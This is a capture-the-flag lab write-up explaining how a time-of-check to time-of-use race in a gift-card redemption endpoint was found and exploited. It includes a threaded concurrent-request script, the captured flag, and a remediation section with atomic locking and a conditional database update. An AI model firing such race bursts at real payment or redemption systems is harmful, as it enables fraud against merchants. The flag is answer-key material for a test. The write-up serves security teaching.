# Methodology — LOOM & CO (Race Condition / TOCTOU)

My working notes while solving this lab.

## 1. Approach

Went white-box this time. There's a single one-time gift card, so this isn't a "reuse multiple cards"
logic flaw — I looked at *how* the single use is enforced.

The redemption code checks whether the card was used and sets the flag:

```python
state["giftcard_used"] = True
```

But there's a big tell right above it:

```python
time.sleep(0.25)
```

Same pattern as a lab I solved before — **Time-Of-Check to Time-Of-Use (TOCTOU)**. The check and the
update aren't atomic, and the `sleep` widens the window. I can reuse my earlier race script with a few
edits.

## 2. Exploitation

Pointed the script at the redeem endpoint (`/api/redeem-giftcard`, port 9004) and fired concurrent
requests so many pass the "is it used?" check before any of them sets the flag:

```python
import subprocess, threading

def worker(i):
    barrier.wait()                       # release all threads at once
    out = subprocess.check_output([
        "curl", "-s", "-X", "POST", f"{URL}/api/redeem-giftcard",
        "-H", "Content-Type: application/json",
        "-d", '{"code": "WELCOME100"}',
    ])
    results[i] = out.decode().strip()
```

The burst stacks the credit well past the limited item's price. Checkout → flag:

```
FLAG{r4c3_c0nd1t10n_1n_th3_ch3ck0ut}
```

## 3. Remediation

Fix the TOCTOU by making the check-and-update **atomic** — not by removing the `sleep` (that only
shrinks the window):

```python
import threading
lock = threading.Lock()

with lock:
    if not state["giftcard_used"]:
        state["giftcard_used"] = True
        state["credit"] += 100.00
```

In a real system the database enforces this: a single conditional write
(`UPDATE ... SET used=1 WHERE code=? AND used=0`) acting only if exactly one row changed, or a unique
constraint on the redemption.
